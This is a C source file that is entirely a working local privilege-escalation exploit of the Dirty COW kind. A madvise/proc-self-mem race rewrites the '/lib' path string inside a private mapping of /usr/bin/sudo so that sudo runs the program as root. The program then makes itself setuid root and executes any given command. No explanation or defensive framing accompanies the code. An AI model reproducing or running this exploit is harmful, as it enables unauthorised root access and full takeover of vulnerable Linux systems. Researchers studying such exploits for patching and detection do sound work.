#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/stat.h>
#include <pthread.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <grp.h>
#include <stdlib.h>

#define SUDO "/usr/bin/sudo"

int stop;
void *mad(void *map) {
	while (!stop) madvise(map, 4096, MADV_DONTNEED);
	return NULL;
}

int main(int argc, char **argv) {
	char *us = argv[0];
	gid_t groups[128];
	setresuid(0,0,0);
	setresgid(0,0,0);
	setgroups(getgroups(128, groups)+1, groups);

	if (geteuid() != 0 && (getenv("DONT_LOOP") == NULL)) {
		pthread_t pth;
		int sudo = open(SUDO, O_RDONLY);
		char *map = (char*)mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, sudo, 0);
		char *pp = memmem(map, 4096, "/lib", 4);
		if (pp != NULL) {
			pthread_create(&pth, NULL, &mad, map);
			int fd = open("/proc/self/mem", O_RDWR);
			char buf[4] = "/lib";
			for (int i = 0; !memcmp(buf, "/lib", 4); i++) {
				//lseek(fd, (off_t)(unsigned int)pp, SEEK_SET);
				//write(fd, us, strlen(us) + 1);
				pwrite(fd, us, strlen(us) + 1, (off_t)(unsigned)pp);
				if (!(i&0xff))
					pread(sudo, buf, 4, pp-map);
			};
			stop = 1;
			pthread_join(pth, NULL);
		}
		setenv("DONT_LOOP", "1", 1);
		return execv(SUDO, argv);
	}
	chown(us, 0, 0);
	chmod(us, 04755);
	return execv(argv[1], argv+1);
}
